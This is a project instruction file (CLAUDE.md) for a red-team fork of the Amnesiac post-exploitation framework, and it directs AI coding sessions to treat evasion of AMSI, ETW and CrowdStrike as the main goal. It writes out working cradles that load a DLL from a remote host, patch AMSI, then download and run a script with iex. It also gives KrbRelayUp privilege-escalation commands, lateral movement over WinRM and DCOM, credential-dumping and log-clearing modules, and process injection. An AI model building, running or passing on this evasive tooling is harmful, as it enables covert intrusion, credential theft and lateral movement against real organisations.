# Amnesiac — Red Team Edition

> **For AI development sessions:** Read `docs/ARCHITECTURE.md` for the full architecture reference before making any changes. The single most important rule: **detection evasion is the primary engineering constraint** — every feature must be evaluated for disk artifacts, AMSI/ETW signatures, and anomalous target-side network traffic before implementation.

---

## Project Objective

Extend the [Amnesiac](https://github.com/Leo4j/Amnesiac) post-exploitation framework into a red-team-grade tool that:

1. Operates with **zero disk writes** on targets by default
2. Evades **CrowdStrike Falcon** behavioral detection through in-memory .NET assembly loading, indirect syscalls, call stack spoofing, and sleep masking
3. Works from both **non-domain-joined** and **domain-joined** operator machines on an internal network
4. Delivers all tool modules **over the named pipe channel** — no GitHub downloads from targets

All existing Amnesiac functionality (sessions, commands, tool modules) remains fully operational.

---

## Operational Scenarios

### Scenario 1 — Non-Domain-Joined Operator (Red Team External)
Operator machine is **not joined to the target domain**. Operator has full local admin on their own machine and domain credentials for the target environment. Loading method is not a concern — operator can disable Defender on their own machine as needed.

Launch from a domain-credentialed session:

```powershell
runas /netonly /user:DOMAIN\username powershell.exe
# In the new PS window:
. .\Amnesiac.ps1; Amnesiac -NoDomain -IP <operator-IP>
```

Set engagement profile:
```
engagement nondomained
```

Amnesiac detects the network logon token (`runas /netonly` creates a Type-9 NewCredentials logon) and confirms domain credential availability.

**Key characteristics:**
- Operator machine is NOT monitored — no loading constraints, Defender can be disabled
- Full local admin — can run `serve`, write files, start listeners
- `diskmode` defaults OFF (protects targets); operator can enable it on their own machine safely
- All target-side operations remain in-memory

### Scenario 2 — Low-Privilege Assumed Breach (Domain-Joined, EDR-Protected)
Operator has obtained a **low-privilege shell on a domain-joined machine** running Windows Defender and a corporate EDR (e.g., CrowdStrike Falcon). The operator runs Amnesiac on THIS compromised machine to enumerate, exploit, and move laterally.

**Loading approach — 3-liner in-memory bootstrap (preferred, stronger against EDR):**

`AmnesiacLoader.dll` is loaded as raw bytes via `[Reflection.Assembly]::Load()` — AMSI never scans binary bytes loaded this way. The DLL's `Bypass` class then patches AMSI via pure .NET reflection before Amnesiac is downloaded. Nothing written to disk.

Use the `bootstrap` command in Amnesiac's local shell to get the exact current 3-liner with randomized names. The static version below is for the current build:

```powershell
# Line 1: load AmnesiacLoader.dll from GitHub Releases as raw bytes (AMSI never scans this)
$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/GNToN66tfw.dll'))
# Line 2: call PatchAmsiReflection() via reflection — AMSI blind in this PS process
$_a.GetType('GNToN66tfw.XsADynQePJ').GetMethod('sNEAGV9Yaj').Invoke($null,$null)
# Line 3: now load Amnesiac — AMSI can't scan it
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac
```

**With operator HTTP server on network (preferred — no outbound GitHub from target):**
```powershell
$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<operator-IP>:4443/GNToN66tfw.dll'))
$_a.GetType('GNToN66tfw.XsADynQePJ').GetMethod('sNEAGV9Yaj').Invoke($null,$null)
iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:4443/Amnesiac_ShellReady.ps1');Amnesiac
```

**PS-only fallback (weaker — use if DLL unavailable):**
```powershell
# Run any option [1]-[4] from 'bootstrap' command, then:
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac
```

Once loaded into memory, all existing stealth features handle the rest — bypasses active in every generated payload, all tool delivery over the named pipe, no disk writes.

Set engagement profile:
```
engagement domained
```

**Key characteristics:**
- AMSI bypass must run BEFORE the `iex` — the script is scanned on download
- Use `Amnesiac_ShellReady.ps1` (no ANSI colour codes — cleaner for constrained shell environments)
- `diskmode` MUST remain OFF — any disk write may be scanned
- Low-privilege: `serve` cannot write files to disk (diskmode off blocks it); use operator HTTP server to host tools pre-loaded from `Tools\`
- The operator HTTP server (`serve`) should also host `Amnesiac_ShellReady.ps1` so Scenario 2 machines pull from it rather than GitHub

---

## Architecture

See full design spec: `docs/superpowers/specs/2026-05-23-amnesiac-stealth-overhaul-design.md`

Four improvement layers, all changes in `Amnesiac.ps1`:

| Layer | What it does |
|-------|-------------|
| **Layer 1** | Disk elimination — no writes on operator or target by default |
| **Layer 2** | Payload generation — stealth format extensions, AmnesiacLoader C# assembly, AES pipe encryption |
| **Layer 3** | In-memory tool delivery — replaces GitHub downloads with in-pipe streaming |
| **Layer 4** | Operational guardrails — engagement profiles, runas/netonly detection, environment keying |

---

## Key Commands (New)

| Command | Description |
|---------|-------------|
| `diskmode [on\|off]` | Toggle disk writes (default: off) |
| `engagement [nondomained\|domained\|reset]` | Set operational profile |
| `launcher` | Cycle execution vector (ps → wmi → schtask → com) |
| `psk <passphrase>` | Set AES pre-shared key for pipe channel |
| `key hostname\|domain\|user <value>` | Set payload environment key |
| `key clear` | Remove all environment keys |
| `modules` | List tool cache status |
| `modules reload` | Refresh tool cache from Tools\ |
| `artifacts` | List in-memory captured artifacts |
| `save <type>` | Write artifact to operator disk |
| `RunBin <name> [args]` | Reflectively load a .NET assembly in-memory (local shell + sessions) |
| `winrm computername=<IP> username=<dom\user> password=<pass>` | Deliver bind shell payload via WinRM — no active session, no local admin, no serve needed. Requires target user in `Remote Management Users`. |
| `winrmscan username=<dom\user> password=<pass> [range=10.x.x.1-30]` | Scan a host range for WinRM-accessible targets for the given credential. TCP-probes port 5985 first, then WSMan auth test. |
| `dcom computername=<IP> [method=ShellWindows\|ShellBrowserWindow\|MMC20]` | Deliver bind shell via DCOM. ShellWindows/ShellBrowserWindow require no local admin — piggyback on existing `explorer.exe` (DCOM Access permission, allowed for domain users). Needs active interactive session on target + `serve` running. MMC20 requires local admin. **Note:** returns `0x80070005` when called from a non-domain-joined machine (runas /netonly) — DCOM activation is rejected at the class factory level regardless of credentials. Only reliable from a domain-joined operator machine or an existing pipe session. |
| `servelog` | Print the serve request log (timestamped 200/404 lines, coloured by status) |
| `bootstrap` | Scenario 2: print all AMSI bypass options + complete GitHub 3-liner and local-server 3-liner with current build's randomized names |

### LPE Commands (local shell + active sessions)

| Command | Tool file | Effect |
|---------|-----------|--------|
| `PowerUp` | `PowerUp.ps1` | Load and auto-run `Invoke-AllChecks` |
| `PrivescCheck` | `PrivescCheck.ps1` | Load and auto-run `Invoke-PrivescCheck` |
| `GodPotato` | `Invoke-GodPotato.ps1` | Load GodPotato; prompts for command to run as SYSTEM |
| `KrbRelayUp [args]` | `AuthHelper.exe` (GitHub Releases) | Kerberos relay LPE — low-priv domain user → SYSTEM via RBCD or Shadow Credentials |

**KrbRelayUp binary:** obfuscated build of [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) uploaded to GitHub Releases as `AuthHelper.exe`. Configured via `$global:KrbRelayUpBin` in `Initialize-ToolCache`. `Fetch-BinaryTool` resolves it via `$global:ToolSources` → GitHub Releases URL; falls back to `serve` if operator HTTP server is running.

**KrbRelayUp usage:**
```
KrbRelayUp full -m rbcd              # full auto attack — RBCD method (most common)
KrbRelayUp full -m shadowcred        # full auto attack — Shadow Credentials (requires ADCS)
KrbRelayUp relay -m rbcd -cls ace -cn FAKE01 -cp 123456789   # manual relay phase only
KrbRelayUp krbscm                    # get SYSTEM shell via SCM after relay
KrbRelayUp spawn -m rbcd -sc <b64>   # spawn shellcode as SYSTEM
```

**Prerequisites:** domain-joined machine, low-priv domain account sufficient. Requires LDAP signing not enforced and machine account quota > 0 (default is 10). Does NOT require local admin — this is the primary LPE path for hodor-level accounts.

**Hint auto-fill:** `$global:Domain` and `$global:DomainController` are promoted to globals at Amnesiac init time. When `-Domain`/`-DomainController` are passed to `Amnesiac`, the no-args `KrbRelayUp` usage block automatically renders the correct values in all three example commands instead of `<domain>`/`<DC_IP>` placeholders. `KrbRelayUp*` is included in the 300s extended timeout condition alongside `Kerb`/`Mimi`/`AutoMimi`.

## Shell Types

| Option | Direction | Auth | When to use |
|--------|-----------|------|-------------|
| `[1] Reverse Shell` | Target → operator machine (port 445 inbound on operator) | Target authenticates to operator's SMB — NTLM/guest, messy on non-domain machine | Scenario 2 (compromised domain-joined machine calling back) |
| `[2] Bind Shell` | Operator → target machine (port 445 inbound on target) | Operator authenticates to target's SMB using domain creds — clean Kerberos | **Scenario 1** (non-domain-joined operator with domain creds) |

Amnesiac shows an explicit warning when `-NoDomain` is set and reverse shell is selected: `Scenario 1 (non-domain): reverse shell requires port 445 inbound on this machine. Consider Bind Shell instead.`

**Bind shell flow (Scenario 1) — delivery priority:**

| Priority | Command | Requires | When to use |
|----------|---------|----------|-------------|
| **1 — Primary** | `winrm computername=<IP> username=<user> password=<pass>` | Target user in `Remote Management Users` | No active session, no local admin, no serve — cleanest option |
| **2 — No-admin DCOM** | `dcom computername=<IP> [method=ShellWindows]` | Active interactive session on target + `serve` running | No local admin needed; piggybacks on explorer.exe via DCOM Access permission |
| **3 — Local admin** | `Invoke-SMBRemoting` / `Invoke-WMIRemoting` in local shell | Local admin on target | Target has no WinRM or active session but you have local admin creds |
| **4 — Last resort** | `sharprdp computername=<IP> username=<user> password=<pass>` | Active unlocked RDP session on target + `serve` running | Only when all above are unavailable; invasive (kicks the user) |

**Step-by-step (WinRM primary path):**
1. Main menu → `[2] Bind Shell` → pick `stealth` payload format → `[2] Full command`
2. Payload is copied to clipboard. Prompt appears:
   ```
    [*] Deliver: winrm computername=<IP> username=<user> password=<pass>  (preferred)
    [D] Open local shell to deliver payload (returns here to start listener)
    [Enter] Start listener now
   ```
3. Press `D` → drops into local shell. Type `winrm computername=<IP> username=DOMAIN\user password=pass`. Type `back` when done.
4. Listener starts. Enter the target IP/hostname when prompted.
5. Target executes payload → creates named pipe server. Amnesiac connects and session appears under `Bind Shell Sessions`.

**SharpRDP last-resort (step 3 only if WinRM/SMB unavailable):**
- Requires active, unlocked RDP session on target — invasive (kicks the session on delivery)
- Run `serve` in local shell first (target downloads payload via HTTP)
- Then: `sharprdp computername=<IP> username=DOMAIN\user password=pass`

## Listener UX

When the operator selects **single listener** or **global listener** from the main menu, `Show-PayloadMenu` runs first and presents a numbered format picker:

```
  [1] b64     — base64 encoded one-liner (most compatible)
  [2] gzip    — gzip+base64 compressed, shorter footprint
  [3] stealth — gzip+obfuscated, includes AMSI/ETW/SBL/Transcription bypasses
  [4] raw     — inline PowerShell, no encoding
  [5] pwsh    — Start-Process launcher, spawns hidden PS process
```

**Single listener behaviour:**
- Waits indefinitely (no timeout) using `WaitForConnectionAsync` + 150ms poll loop
- Press `Q` to cancel — a self-connecting dummy pipe unblocks the server cleanly
- On callback: automatically enters `InteractWithPipeSession` (no extra menu step)

**Global listener behaviour:**
- Polls `Scan-WaitingTargets` every 500ms after displaying the payload
- Prints arriving sessions in green as they connect: `[+] Session received: HOST [user]`
- Press `Q` to stop; reports total new sessions collected

## Ctrl+C Handling

Ctrl+C behaviour is scoped per context — different layers have different handlers:

| Context | Ctrl+C behaviour |
|---------|-----------------|
| **Main menu** (idle or waiting) | `trap [PipelineStoppedException]` asks `Kill Amnesiac? [y/N]` — single keypress, no Enter. `Y` exits cleanly; anything else resumes. |
| **Local shell prompt** | Ctrl+C cancels the current `Read-Host` input, prints `[!] Interrupted`, re-shows prompt. Does NOT exit Amnesiac. |
| **Local shell tool running** | Ctrl+C kills the running command (PowerUp, KrbRelayUp, etc.), prints `[!] Interrupted`, returns to `[local]:` prompt. |
| **Pipe session** (`back` to exit) | `TreatControlCAsInput = $true` — Ctrl+C is treated as input, ignored. Use `back` to exit the session. |
| **Migrate inline loop** (`back` to exit) | Same as pipe session — `TreatControlCAsInput = $true`, Ctrl+C ignored. |
| **Option 4 scan** | `TreatControlCAsInput = $true` during the poll loop — Ctrl+C cancels the scan job and returns to menu within 1s. |

**Implementation:** `trap [PipelineStoppedException]` is placed at two scopes:
1. `Amnesiac` function scope — main menu protection with confirmation prompt
2. `Start-LocalShell` function scope — interrupts running tools, `continue`s back to prompt; consumes the exception so it never propagates to scope 1

---

## AmnesiacLoader — C# Assembly

Located in `AmnesiacLoader/`. Provides:
- Indirect syscall process injection (EAT-walking SSN resolution)
- Call stack frame spoofing
- Sleep masking (AES encrypt memory during dormancy)

### Build Requirements
- `csc.exe` from .NET Framework 4.x (ships with Windows — no SDK needed): `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`
- Target framework: net462 (runs on any Windows with .NET 4.6.2+)

### Build & Embed
```powershell
cd AmnesiacLoader
.\Build.ps1
# This compiles AmnesiacLoader.dll, base64-encodes it,
# and updates $AmnesiacLoaderB64 in Amnesiac.ps1 automatically
```

### Pre-built
A pre-built base64 blob is included in `Amnesiac.ps1` as `$AmnesiacLoaderB64`.
Run `Build.ps1` once before an engagement. The compiled blob and name map are baked into `Amnesiac.ps1` permanently — no rebuild needed per session. Re-run only when modifying C# source or wanting fresh names before a new engagement.

**Pre-engagement (one time):**
```powershell
cd AmnesiacLoader; .\Build.ps1   # compile + embed blob and name map into Amnesiac.ps1
```
After that:
```
Scenario 1: . .\Amnesiac.ps1; Amnesiac -NoDomain -IP <ip>
Scenario 2: iex (DownloadString); Amnesiac   (blob already embedded in ShellReady)
```

**Auto-loader guard:** If `$AmnesiacLoaderB64` is empty when a session connects with AutoLoader ON, a warning is printed instead of silently skipping: `[!] Auto-loader: blob not embedded — run AmnesiacLoader\Build.ps1 first`. Same warning is shown when typing `autoloader on` with an empty blob.

### Name Randomization (Build-Time)
Every `Build.ps1` run randomizes the namespace, all public class names (Stomper, Injector, NativeLoader, Bypass), all public method names, and all internal class names using word-boundary regex substitution on temp source copies before compiling. The compiled DLL is named `<random>.dll`. A PS-side name map block (`# !!AL-MAP-BEGIN!! ... # !!AL-MAP-END!!`) is written to both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1` containing:

| Variable | Maps to |
|----------|---------|
| `$_alNs` | Namespace |
| `$_alStp` | Stomper class |
| `$_alConc` | ConcealLoadedAssembly method |
| `$_alInj` | Injector class |
| `$_alInPS` | InjectUnmanagedPS method |
| `$_alSpwn` | SpawnUnmanagedPS method |
| `$_alNL` | NativeLoader class |
| `$_alNLLd` | NativeLoader.Load method |
| `$_alByp` | Bypass class (used in bootstrap 3-liner) |
| `$_alPar` | PatchAmsiReflection method (used in bootstrap 3-liner) |

All pipe commands, the `bootstrap` command, and serve/sharprdp cradles use these variables — the target never sees `AmnesiacLoader`, `Stomper`, `Bypass`, or `PatchAmsiReflection`.

**Current build note:** `$_alByp = "XsADynQePJ"`, `$_alPar = "sNEAGV9Yaj"`. These are correct for the embedded `GNToN66tfw.dll`. All class/method names are fully randomized in this build.

Detection surfaces eliminated:
- Named pipe command content (pipe scanners)
- ETW AssemblyLoad events (assembly name = random)
- CLR heap metadata (type/method name strings)
- Bootstrap 3-liner — no static class/method name strings visible in PS history or logs

### GitHub Releases Hosting
The compiled DLL is also uploaded to GitHub Releases (`v1.0-al`) so Scenario 2 targets with internet access can load it without an operator HTTP server. After every `Build.ps1` run that will be used in an engagement, upload the new DLL and update the bootstrap docs — see **GitHub Repository & Releases Management** section below for the exact procedure.

The `bootstrap` command automatically uses `$_alNs` to construct the correct GitHub Releases URL — always matches the current build.

---

## Native Launcher — amsi-pageguard-veh-master

A native C++ launcher (`amnesiac_launcher.exe`) that stages `Amnesiac_ShellReady.ps1` entirely in memory using CLR hosting, with no disk write and no PowerShell process visible in the process list.

### Architecture

Two-stage bypass — split between native and managed because PAGE_GUARD VEH and in-process CLR are mutually incompatible:

| Stage | Location | Technique |
|-------|----------|-----------|
| Download phase | `launcher.cpp` (native) | PAGE_GUARD VEH on `AmsiScanBuffer` — intercepts AMSI scan during `DownloadString`, patches return value, then **uninstalls before CLR load** |
| Runspace phase | `AmnesiacBridge.cs` (managed) | `amsiInitFailed=true` via reflection (patchless); `EtwEventWrite→0xC3` one-byte patch |

**Why the split:** Setting PAGE_GUARD on amsi.dll's code page and manipulating `RIP/RSP/RAX` in the VEH fires again during `rs.Open()` when the CLR JIT touches the same page. This corrupts the managed→unmanaged transition frame and raises an uncatchable `AccessViolationException` in .NET 4.x. The fix: `UninstallBypass()` is called in `launcher.cpp` **before** `ExecuteInDefaultAppDomain`, then `AmnesiacBridge` applies its own patchless bypasses before `Runspace.Open()`.

### Components

| File | Purpose |
|------|---------|
| `launcher.cpp` | Native entry point — `DownloadString` via WinHTTP, VEH bypass for download phase, CLR host via `ICLRRuntimeHost::ExecuteInDefaultAppDomain` |
| `bypass.hpp` | PAGE_GUARD VEH implementation — `InstallBypass` / `UninstallBypass` / `ReprotectAll` |
| `AmnesiacBridge.cs` | Managed bridge — `DisableAmsi()` (reflection), `PatchEtw()` (P/Invoke), full PSHost + Runspace, `BeginInvoke/EndInvoke` with `DataAdded` streaming |
| `AmnesiacBridge.csproj` | net462 target, references system SMA DLL |
| `build.ps1` | Builds bridge with Roslyn csc, compiles launcher with MSVC cl.exe |
| `.gitignore` | Excludes all compiled binaries (`*.exe`, `*.dll`, `*.obj`, etc.) — do NOT commit binaries to public repo |

### Build

```powershell
cd amsi-pageguard-veh-master
.\build.ps1
# Outputs: amnesiac_launcher.exe, AmnesiacBridge.dll
```

Requires: MSVC build tools at `C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\`, Roslyn csc, SMA DLL from WinSxS.

### Usage

```
amnesiac_launcher.exe http://<operator-IP>:4443
```

Operator's `serve` must be running to serve `Amnesiac_ShellReady.ps1`. The launcher fetches it, applies bypasses, and runs the full Amnesiac session in a native process.

---

## Tool Delivery

Tools reach targets via the named pipe channel exclusively — no network calls from targets.

### Operator-Side Tool Cache (pre-session)

`Initialize-ToolCache` populates `$global:ToolCache` at startup in priority order:

| Priority | Source | How |
|----------|--------|-----|
| 1 | Embedded gzip+base64 in Amnesiac.ps1 | Always available: SimpleAMSI, NETAMSI, Token-Impersonation, Invoke-SMBRemoting, Invoke-WMIRemoting, Find-LocalAdminAccess |
| 2 | `Tools\` directory | Loaded at startup; `modules reload` refreshes |
| 3 | GitHub on-demand (`Fetch-ToolFromGitHub`) | Fetches from `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/<name>.ps1`; per-tool URL overrides in `$global:ToolSources` (e.g. PsMapExec from its own repo). Operator-side only — target never fetches from network. |

**The intended fallback chain:** Operator HTTP server first → GitHub only if server not running.

**Tier 3 — GitHub on-demand fetch (`Fetch-ToolFromGitHub`):**
Implemented as a helper called by `Send-Module`, `Start-LocalShell` keyword dispatch, and `load <name>`. When a tool is not found in tiers 1–2, it fetches `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/<ToolName>.ps1` operator-side, caches it in `$global:ToolCache`, and proceeds normally. This is the correct fallback for Scenario 2 (operator has only the compromised machine, no local server). Target never makes any network call.

**Binary tool fetch (`Fetch-BinaryTool`):**
Used by `RunBin`. Fetches `.exe` or `.dll` binaries via `DownloadData` (binary-safe), stores as base64 in `$global:ToolCache`. Tries `http://<ListenerIP>:4443/<name>.exe` then `.dll` first, then falls back to GitHub. Binary and script caches are unified — same `$global:ToolCache` key, different content type inferred from usage context.

### Target-Side Delivery (in-session)

`Send-Module <toolname>` streams from `$global:ToolCache` over the named pipe:
1. `__MODULE_BEGIN__:<name>:<length>`
2. `__MODULE_CHUNK__:<base64-4KB>` (repeated)
3. `__MODULE_END__:<name>`

Target assembles chunks and executes via `[scriptblock]::Create($source).Invoke()`.
Binary modules (.exe/.dll): base64-decode → `[Reflection.Assembly]::Load()`.

### RunBin — Reflective .NET Assembly Loading

`RunBin <name> [args]` loads a managed assembly entirely in memory with no disk write.

**Local shell (option 5):**
1. Checks `$global:ToolCache`; calls `Fetch-BinaryTool` on miss
2. `[Reflection.Assembly]::Load([byte[]])` in the operator's process
3. `EntryPoint.Invoke($null, @(,[string[]]$args))`

**Active pipe session:**
1. Checks cache; fetches via `Fetch-BinaryTool` on miss
2. Streams to target via `Send-Module` chunked protocol
3. Sends one-liner: finds assembly in `[AppDomain]::CurrentDomain.GetAssemblies()` by name, calls `EntryPoint.Invoke`

Scope: managed .NET assemblies only. For DLLs without an entry point, use `load <name>` to dot-source or `[Reflection.Assembly]::LoadFrom` manually.

---

## OPSEC Checklist (Pre-Engagement)

- [ ] Launch from `runas /netonly` session (Scenario 1) or domain-joined machine (Scenario 2)
- [ ] Set `engagement nondomained` or `engagement domained`
- [ ] Verify `diskmode` is OFF (default)
- [ ] Confirm tool cache loaded: run `modules`
- [ ] Run `serve` if heavy modules needed
- [ ] Set `psk <passphrase>` for AES pipe encryption
- [ ] Set `key hostname <target>` before generating payloads (optional but recommended)
- [ ] Review startup OPSEC summary banner

---

## File Structure

```
Amnesiac-main/
├── Amnesiac.ps1                    — main framework (all modifications here)
├── Amnesiac_ShellReady.ps1         — shell-compatible version (no colours)
├── Tools/                          — tool modules (Standard tier)
│   ├── SimpleAMSI.ps1
│   ├── NETAMSI.ps1
│   ├── PowerUp.ps1                 — LPE: privilege escalation checks
│   ├── PrivescCheck.ps1            — LPE: comprehensive audit
│   ├── Invoke-GodPotato.ps1        — LPE: potato SYSTEM escalation
│   ├── ... (other tools)
│   └── RDPKeylog.exe
├── AmnesiacLoader/                 — C# assembly (process injection, sleep masking)
│   ├── Loader.cs
│   ├── CallStack.cs
│   ├── SleepMask.cs
│   ├── AmnesiacLoader.csproj
│   └── Build.ps1
├── amsi-pageguard-veh-master/      — native launcher (CLR-hosted, no powershell.exe)
│   ├── launcher.cpp                — native entry, WinHTTP fetch, CLR host
│   ├── bypass.hpp                  — PAGE_GUARD VEH bypass (download phase only)
│   ├── AmnesiacBridge.cs           — managed bridge (patchless AMSI + ETW, Runspace)
│   ├── AmnesiacBridge.csproj
│   ├── build.ps1                   — build script (MSVC + Roslyn)
│   └── .gitignore                  — excludes all compiled binaries
├── docs/
│   └── superpowers/specs/
│       └── 2026-05-23-amnesiac-stealth-overhaul-design.md
├── CLAUDE.md                       — this file
├── CHANGELOG.md                    — change history
└── README.md                       — original Amnesiac readme
```

---

## Help Menu — Privilege Markers

All help blocks (`Get-AvailableCommands` for pipe sessions, local shell `help`, and
`Amnesiac_ShellReady.ps1`) annotate commands with privilege requirements:

| Marker | Meaning |
|--------|---------|
| `[A]` | Local admin (or SeDebugPrivilege) required |
| `[DA]` | Domain admin / DCSync delegation required |
| *(none)* | Works as a standard domain user |

**Marked `[A]`:** `ClearLogs`, `RDPKeylog`, `Mimi`, `AutoMimi`, `GetSystem`, `HashGrab`,
`Hive`, `Migrate`/`Migrate2`/`Migrate ps`, `MultiRDP`, `PPL`, `Impersonation`, `Remoting`

**Marked `[DA]`:** `DCSync`

**Intentionally unmarked despite privilege nuance:** `Kerb` and `Monitor` read the current
user's own TGT cache — no LSASS access needed. `SessionHunter` uses `NetSessionEnum` which
works as a domain user against DCs and older member servers (restricted only on Server 2016+
member servers by default policy).

---

## Pipe Loop — CLR Runspace Output Capture

### Why this matters

When a session is delivered via the Bootstrap CMD payload (option [2]), `AmnesiacLoader`'s
`InjectUnmanagedPS` creates a bare CLR Runspace using `RunspaceFactory.CreateRunspace()` with **no
PSHost attached**. This is different from option [1] (reverse/bind shell) which spawns a real
`powershell.exe` process with a full PSHost. The missing PSHost causes silent output loss for any
tool that uses `Write-Host`.

### How Write-Host fails in a bare CLR Runspace

In PS 5.1, `Write-Host` creates an `InformationRecord` and routes it to two places:
1. Stream 6 (Information) — `*>&1` can capture this
2. `PSHost.UI.WriteInformation()` — the PSHost callback

With no PSHost, the `PSHost.UI` call silently throws an internal NullReferenceException. The
`InformationRecord` is never dispatched to stream 6 either. `*>&1` captures nothing. Result: any
tool using `Write-Host` for its output (PrivescCheck audit tables, PowerUp banners, etc.) produces
zero output in the pipe session.

### The fix — Write-Host override injected per-command

`New-PayloadScript` builds a `Write-Host` override string and stores it in a randomly-named
variable (`$vWHO`) in the generated target script:

```powershell
# At script level in the generated pipe script:
$<rand> = 'function Write-Host{
    param([Parameter(Position=0,ValueFromRemainingArguments=$true)]$Object,
          [switch]$NoNewline, $ForegroundColor, $BackgroundColor, [string]$Separator)
    if($null -ne $Object){ Write-Output $Object }
}'
```

At command execution time, the override string is **prepended to every command scriptblock**:

```powershell
. ([scriptblock]::Create($<rand> + ';' + $vCmd))
```

**Why per-command, not a global preamble:** A `function global:Write-Host` preamble added to
`$rawScript` before the pipe setup was tested and failed — `global:` scope is not reliably in the
dynamic scope chain for nested function calls inside a bare CLR Runspace. The only reliable
approach is prepending to the same `scriptblock` that executes the command.

**Why parameter names must match exactly:** The override must use `$Object`, `$ForegroundColor`,
`$BackgroundColor`, `$NoNewline`, `$Separator` — the real Write-Host parameter names. Using
abbreviated names (e.g., `$whO`, `$whFC`) causes named argument binding to fail: `-ForegroundColor
Cyan` cannot find a parameter named `ForegroundColor` and the colour value spills into the
catch-all `ValueFromRemainingArguments`, corrupting the message text.

### Pre-crash output survival — streaming List\[string\]

PrivescCheck (and potentially other tools) call service/SID checks with null ObjectSid values.
`[ValidateNotNullOrEmpty()]` throws a `ParameterBindingValidationException` — a **terminating**
exception that propagates through the pipeline. When this kills the pipeline mid-run:

- `Out-String.EndProcessing()` is never called — its internal `StringBuilder` is discarded
- `$vRes` ends up null — ALL output produced before the crash is lost

**Fix:** A `[System.Collections.Generic.List[string]]` collector receives each formatted line as it
arrives. `Out-String -Stream` formats each object via PS's formatting engine (so PSCustomObjects get
proper property tables) and emits one string per formatted line. Each line is committed to the list
immediately — already in `$vCl` before the exception can abort the pipeline.

### Final pipe loop pattern

```powershell
$vCl = [System.Collections.Generic.List[string]]::new()
try {
    . ([scriptblock]::Create($vWHO + ';' + $vCmd)) *>&1 |
        Out-String -Stream |
        % { $vCl.Add("$_") }
} catch {
    $vCl.Add("$($_.Exception.Message)")
}
$vCl | % { $vWr.WriteLine($_.TrimEnd()) }
$vWr.WriteLine($endMarker); $vWr.Flush()
```

| Element | Purpose |
|---------|---------|
| `$vWHO + ';' + $vCmd` | Write-Host override always in same scope as command |
| `. ([scriptblock]::Create(...))` | Dot-source so function definitions from modules persist |
| `*>&1` | Merge all streams to pipeline (errors, warnings, verbose, etc.) |
| `Out-String -Stream` | Format PSCustomObjects via PS formatting engine; pass plain strings through |
| `$vCl.Add(...)` | Commit each line immediately — survives mid-run terminating exceptions |
| `catch { $vCl.Add(...) }` | Append exception message without losing pre-crash output |
| `TrimEnd()` | Strip trailing whitespace that accumulates from `Out-String` formatting |

### Debugging if output capture regresses

| Symptom | Likely cause |
|---------|-------------|
| No output at all from Write-Host tools | Override not injected (check `$vWHO` in `$rawScript`) or wrong param names |
| Only exception message, no output before it | `Out-String` buffer loss — check `List[string]` + `Out-String -Stream` pattern |
| PSCustomObjects as `@{key=val}` | `Out-String -Stream` missing — check pipeline between `*>&1` and list-fill |
| Works in local shell (option [5]), broken in pipe session | CLR Runspace issue (option [2]) vs full PSHost (option [1]/[5]) |
| Works in option [1] session, broken in option [2] | Same as above — check if Bootstrap CMD payload regenerated with current script |

---

## Local Shell — Tool Keyword Notes

### `_kw` hint mechanism
Tool-load keywords in `Start-LocalShell` support an optional `hint` field. After a keyword loads
its tools successfully, hint strings are printed in Cyan before any auto-invoke. Add `hint=@("...")`
to any `_kw` entry to surface usage examples on load.

Tools with hints currently: `PInject`, `PowerView`, `LocalAdminAccess`, `SessionHunter`.

### Migrate — process migration from local shell

`Migrate` is handled by two regex branches before the fall-through in `Start-LocalShell`:

| Command | Method | Notes |
|---------|--------|-------|
| `Migrate ps <pid>` | Three-tier fallback (see below) | No PInject needed; works at any privilege |
| `Migrate <pid>` | Shellcode via `PInject` function | Requires `PInject` keyword loaded first; needs same-user same-integrity process |

**`migrate ps <pid>` — three-tier fallback:**

| Tier | Method | Privilege required | Result |
|------|--------|-------------------|--------|
| 1 | AmensiacLoader `InjectShellcode` (indirect syscall) | SeDebugPrivilege (post-LPE) | Real injection into target PID |
| 2 | `ProcessStartInfo` hidden PS spawn | Process creation allowed (medium+ integrity) | New powershell.exe process |
| 3 | Background runspace in Amnesiac process | None | In-process pipe server; `$PID` returns Amnesiac's own PID |

At low privilege (no SeDebugPrivilege, process creation denied), tier 3 always succeeds — the pipe server runs inside the Amnesiac process. This is useful for testing the pipe protocol and for persistence via a second named pipe in the same process, but is NOT true process migration. Run `GodPotato` or another LPE first to get tier 1 real injection.

**Connection:** all tiers use an inline loop (not `InteractWithPipeSession`) so `$global:EndMarker` is always in scope — no timeout issues. `[console]::TreatControlCAsInput = $true` prevents Ctrl+C from killing the session.

**`migrate <pid>` (PInject path):** PInject's `/t:1` (CreateRemoteThread) uses minimal access flags — works for same-user same-integrity processes without SeDebugPrivilege. Load PInject first: type `pinject` at the local shell prompt.

**Bare `Migrate`** (no args) prints usage showing both syntaxes.

### SessionHunter — non-domain-joined usage
From a `runas /netonly` machine, `$env:USERDNSDOMAIN` is null — `Invoke-SessionHunter` with no
arguments fails with `GetDomain`. Always pass `-Domain` and `-DomainController` explicitly:

```powershell
Invoke-SessionHunter -Domain NORTH.SEVENKINGDOMS.LOCAL -DomainController 10.3.10.11
Invoke-SessionHunter -Hunt hodor -Domain NORTH.SEVENKINGDOMS.LOCAL -DomainController 10.3.10.11
```

`NetSessionEnum` (underlying API) is admin-restricted on Server 2016+ member servers — standard
domain users get empty results. The DC itself is more permissive. For reliable results, run from
a session where you have local admin.

---

## Known Gaps (Not Yet Implemented)

| Gap | Impact | Description |
|-----|--------|-------------|
| **Tool cache fallback chain** | RESOLVED | `Fetch-ToolFromGitHub` wired into `Send-Module`, local shell keyword dispatch, and `load <name>`. On cache miss, fetches from GitHub operator-side and caches. |
